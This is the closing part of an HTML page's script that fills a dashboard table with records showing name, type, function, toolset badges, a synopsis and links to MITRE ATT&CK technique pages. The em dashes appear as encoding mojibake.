                return '<span class="badge" style="background: rgba(255, 183, 3, 0.2); color: var(--accent-secondary); border: 1px solid var(--accent-secondary);">' + escapeHtml(toolset) + '</span>';
            }).join(' ');
        } else {
            toolsetCell = '<span class="text-muted">‚Äî</span>';
        }
        
        let mitreCell = '';
        if (record.mitre_techniques && record.mitre_techniques.length > 0) {
            mitreCell = record.mitre_techniques.map(function(technique) {
                const mitreUrl = 'https://attack.mitre.org/techniques/' + technique.replace(/\./g, '/');
                return '<a href="' + mitreUrl + '" target="_blank" class="badge badge-mitre">' + escapeHtml(technique) + '</a>';
            }).join(' ');
        } else {
            mitreCell = '<span class="text-muted">‚Äî</span>';
        }
        
        const synopsis = record.synopsis;
        
        tr.innerHTML = 
            '<td><strong>' + escapeHtml(record.name) + '</strong></td>' +
            '<td><span class="badge badge-type">' + escapeHtml(record.type) + '</span></td>' +
            '<td><span class="badge badge-function">' + escapeHtml(record.function) + '</span></td>' +
            '<td>' + toolsetCell + '</td>' +
            '<td class="muted">' + escapeHtml(synopsis) + '</td>' +
            '<td>' + mitreCell + '</td>';
        
        tbody.appendChild(tr);
    });
    
    updateSortIndicators();
}

// Initialize dashboard when DOM is ready
document.addEventListener('DOMContentLoaded', initDashboard);
</script>

</body>
</html>
